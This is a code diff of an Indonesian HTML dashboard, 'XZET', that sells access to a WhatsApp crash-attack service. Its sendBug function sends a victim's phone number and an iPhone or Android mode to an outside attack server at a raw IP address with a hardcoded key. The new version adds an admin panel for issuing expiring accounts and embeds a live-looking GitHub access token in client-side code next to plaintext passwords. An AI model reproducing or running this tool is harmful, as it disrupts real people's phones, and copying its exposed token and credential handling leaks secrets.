@@ -1,168 +1,210 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>XZET Dashboard</title>
   <style>
-    * { margin:0; padding:0; box-sizing:border-box; }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       font-family: Arial, sans-serif;
       background: url("https://j.top4top.io/p_3468nai4p1.jpg") no-repeat center center fixed;
       background-size: cover;
       color: white;
       height: 100vh;
+      overflow: hidden;
       display: flex;
       justify-content: center;
       align-items: center;
-      flex-direction: column;
     }
     .container {
       background: rgba(15, 15, 15, 0.85);
-      padding: 30px 20px 60px;
+      padding: 30px 20px 40px;
       border-radius: 12px;
       box-shadow: 0 0 10px rgba(0,0,0,0.5);
       text-align: center;
       width: 90%;
-      max-width: 400px;
+      max-width: 420px;
       position: relative;
     }
-    .input {
-      display:block; width:100%;
-      margin:15px 0; padding:10px;
-      background:#1e1e1e; border:1px solid #333;
-      border-radius:6px; color:white; font-size:16px;
+    input, select {
+      display: block;
+      width: 100%;
+      margin: 12px 0;
+      padding: 10px;
+      background: #1e1e1e;
+      border: 1px solid #333;
+      border-radius: 6px;
+      color: white;
+      font-size: 16px;
     }
     button {
-      padding:10px 20px; margin:10px 5px;
-      background:#2b3f5c; color:white; font-weight:bold;
-      border:none; border-radius:6px;
-      cursor:pointer; transition:0.2s;
+      padding: 10px 20px;
+      margin: 10px 5px;
+      background: #2b3f5c;
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: 0.2s;
     }
-    button:hover { background:#3f3f3f; }
-    .hidden { display:none; }
+    button:hover { background: #3f3f3f; }
+    .hidden { display: none; }
     .logout-btn {
-      position:fixed; top:15px; right:15px;
+      position: fixed;
+      top: 15px;
+      right: 15px;
     }
-    .bottom-links {
-      position:fixed; bottom:20px; left:50%;
-      transform:translateX(-50%);
-      display:flex; gap:10px;
+    .links {
+      margin-top: 15px;
+      display: flex;
+      justify-content: center;
+      gap: 10px;
     }
-    .marquee-wrapper {
-      margin-top:15px;
-      font-size:14px; font-weight:bold; color:#ddd;
+    marquee {
+      display: block;
+      margin-top: 15px;
+      color: #ddd;
     }
   </style>
 </head>
 <body>
-
-<!-- Login -->
-<div class="container" id="loginPage">
-  <h2>🔐 Login ke XZET</h2>
-  <input id="username" class="input" type="text" placeholder="Username" />
-  <input id="password" class="input" type="password" placeholder="Password" />
-  <button onclick="login()">Login</button>
-  <p id="errorMsg" style="color:red;margin-top:10px;"></p>
-</div>
-
-<!-- Menu -->
-<div class="container hidden" id="menuPage">
-  <h2>💥 Menu Bug WhatsApp</h2>
-  <input id="target" class="input" type="text" placeholder="Masukkan nomor target 62xxxx" />
-  <button onclick="sendBug('ios')">Crash iPhone</button>
-  <button onclick="sendBug('android')">Crash Android</button>
-  <div class="marquee-wrapper">
-    <marquee behavior="scroll" direction="left" scrollamount="4">
-      Thanks To : BancetMyself - And My God - And My Family
-    </marquee>
+  <div class="container" id="loginPage">
+    <h2>🔐 Login XZET</h2>
+    <input type="text" id="username" placeholder="Username">
+    <input type="password" id="password" placeholder="Password">
+    <button onclick="login()">Login</button>
+    <p id="loginError" style="color:red;margin-top:10px;"></p>
   </div>
-</div>
 
-<!-- Success -->
-<div class="container hidden" id="successPage">
-  <div id="successContent"></div>
-  <button onclick="showPage('menuPage')">🔙 Back to Menu</button>
-</div>
+  <div class="container hidden" id="menuUser">
+    <h2>💥 Bug Menu</h2>
+    <input type="text" id="target" placeholder="Nomor target 62xxxx">
+    <button onclick="sendBug('ios')">Crash iPhone</button>
+    <button onclick="sendBug('android')">Crash Android</button>
+    <button class="logout-btn" onclick="logout()">Logout</button>
+    <marquee>Thanks To : BancetMyself - My God - My Family</marquee>
+    <div class="links">
+      <a href="https://t.me/BancetMyself" target="_blank"><button>Owner</button></a>
+      <a href="https://t.me/SecretMInformation" target="_blank"><button>Channel</button></a>
+    </div>
+  </div>
 
-<!-- Logout + Links -->
-<div class="logout-btn hidden" id="logoutBtn">
-  <button onclick="logout()">Logout</button>
-</div>
-<div class="bottom-links hidden" id="links">
-  <a href="https://t.me/BancetMyself" target="_blank"><button>👑 Owner</button></a>
-  <a href="https://t.me/SecretMInformation" target="_blank"><button>📣 Channel</button></a>
-</div>
+  <div class="container hidden" id="menuAdmin">
+    <h2>⚙️ Admin Dashboard</h2>
+    <input type="text" id="newUser" placeholder="Username baru">
+    <input type="text" id="newPass" placeholder="Password baru">
+    <input type="number" id="expired" placeholder="Masa aktif (hari)">
+    <button onclick="createUser()">Create User</button>
+    <button class="logout-btn" onclick="logout()">Logout</button>
+    <marquee>Thanks To : BancetMyself - My God - My Family</marquee>
+    <div class="links">
+      <a href="https://t.me/BancetMyself" target="_blank"><button>Owner</button></a>
+      <a href="https://t.me/SecretMInformation" target="_blank"><button>Channel</button></a>
+    </div>
+    <p id="adminMsg" style="margin-top:10px;color:lightgreen;"></p>
+  </div>
 
 <script>
-  const USERS_URL = "https://raw.githubusercontent.com/ZauzetGithab/XzetVictus/main/users.json"; 
-  // Ganti USERNAME & REPO dengan repo GitHub public lu
+const GITHUB_TOKEN = "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"; // <<< GANTI TOKEN GHP LU
+const REPO_OWNER = "ZauzetGithab";     // <<< GANTI OWNER GITHUB
+const REPO_NAME = "XzetVictus";           // <<< GANTI REPO
+const FILE_PATH = "users.json";          // File JSON di repo
 
-  async function login() {
-    const u = document.getElementById("username").value.trim();
-    const p = document.getElementById("password").value.trim();
-    const err = document.getElementById("errorMsg");
+let currentUser = null;
 
-    try {
-      const res = await fetch(USERS_URL);
-      if (!res.ok) throw new Error("Gagal ambil data");
-      const users = await res.json();
-      const match = users.find(user => user.username === u && user.password === p);
-
-      if (match) {
-        localStorage.setItem("loggedIn", "true");
-        showPage("menuPage");
-        document.getElementById("logoutBtn").classList.remove("hidden");
-        document.getElementById("links").classList.remove("hidden");
-      } else {
-        err.textContent = "❌ Username atau password salah!";
-      }
-    } catch {
-      err.textContent = "❗ Gagal mengambil data pengguna!";
+// Fetch data user dari GitHub
+async function getUsers() {
+  const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`, {
+    headers: {
+      Authorization: `token ${GITHUB_TOKEN}`,
+      Accept: "application/vnd.github.v3.raw"
     }
+  });
+  if (!res.ok) throw new Error("Gagal ambil data user");
+  return res.json();
+}
+
+// Update users.json ke GitHub
+async function updateUsers(users) {
+  const getFile = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`, {
+    headers: { Authorization: `token ${GITHUB_TOKEN}` }
+  });
+  const file = await getFile.json();
+  const content = btoa(JSON.stringify(users, null, 2));
+
+  return fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`, {
+    method: "PUT",
+    headers: {
+      Authorization: `token ${GITHUB_TOKEN}`,
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      message: "Update users.json",
+      content,
+      sha: file.sha
+    })
+  });
+}
+
+// Login function
+async function login() {
+  const user = document.getElementById("username").value.trim();
+  const pass = document.getElementById("password").value.trim();
+  const error = document.getElementById("loginError");
+  try {
+    const users = await getUsers();
+    const found = users.find(u => u.username === user && u.password === pass);
+    if (!found) return error.textContent = "❌ Username atau Password salah!";
+    if (found.expired && Date.now() > new Date(found.expired).getTime())
+      return error.textContent = "❌ Akun expired!";
+    currentUser = found;
+    showPage(found.isAdmin ? "menuAdmin" : "menuUser");
+  } catch {
+    error.textContent = "❌ Gagal mengambil data!";
   }
+}
 
-  function logout() {
-    localStorage.removeItem("loggedIn");
-    location.reload();
+// Logout
+function logout() {
+  currentUser = null;
+  showPage("loginPage");
+}
+
+// Buat user baru (admin)
+async function createUser() {
+  if (!currentUser?.isAdmin) return;
+  const uname = document.getElementById("newUser").value.trim();
+  const pass = document.getElementById("newPass").value.trim();
+  const days = parseInt(document.getElementById("expired").value);
+  const expired = new Date(Date.now() + days * 86400000).toISOString();
+
+  const users = await getUsers();
+  users.push({ username: uname, password: pass, expired });
+  await updateUsers(users);
+  document.getElementById("adminMsg").textContent = `User ${uname} berhasil dibuat (Expired: ${expired})`;
+}
+
+// Kirim bug API
+async function sendBug(mode) {
+  const target = document.getElementById("target").value.trim();
+  if (!target.startsWith("62")) return alert("Nomor harus diawali 62");
+  const url = `http://170.64.161.133:1905/execution?target=${target}&mode=${mode}&username=Bancet&key=W4BT`;
+  try {
+    await fetch(url);
+    alert(`Bug terkirim ke ${target} [${mode}]`);
+  } catch {
+    alert("Gagal mengirim bug!");
   }
+}
 
-  function showPage(page) {
-    ["loginPage","menuPage","successPage"].forEach(id => 
-      document.getElementById(id).classList.add("hidden"));
-    document.getElementById(page).classList.remove("hidden");
-  }
-
-  async function sendBug(type) {
-    const target = document.getElementById("target").value.trim();
-    if (!target.startsWith("62")) return alert("Nomor harus diawali 62");
-    
-    const today = new Date();
-    const tgl = `${today.getDate()} ${today.toLocaleString('id-ID',{month:'long'})} ${today.getFullYear()}`;
-    const mode = type === "ios" ? "ios" : "andros";
-    const bugType = type === "ios" ? "Crash iPhone" : "Crash Android";
-
-    try {
-      await fetch(`http://170.64.161.133:1905/execution?target=${target}&mode=${mode}&username=Bancet&key=W4BT`);
-      document.getElementById("successContent").innerHTML = `
-        ✅ <b>Success Attack Target</b><br>
-        📱 <b>Target:</b> ${target}<br>
-        🐞 <b>Bug Type:</b> ${bugType}<br>
-        📅 <b>Date:</b> ${tgl}
-      `;
-      showPage("successPage");
-    } catch {
-      alert("Gagal kirim bug!");
-    }
-  }
-
-  window.onload = () => {
-    if (localStorage.getItem("loggedIn") === "true") {
-      showPage("menuPage");
-      document.getElementById("logoutBtn").classList.remove("hidden");
-      document.getElementById("links").classList.remove("hidden");
-    }
-  };
+// Show page
+function showPage(id) {
+  ["loginPage", "menuUser", "menuAdmin"].forEach(page => {
+    document.getElementById(page).classList.add("hidden");
+  });
+  document.getElementById(id).classList.remove("hidden");
+}
 </script>
-
 </body>
 </html>
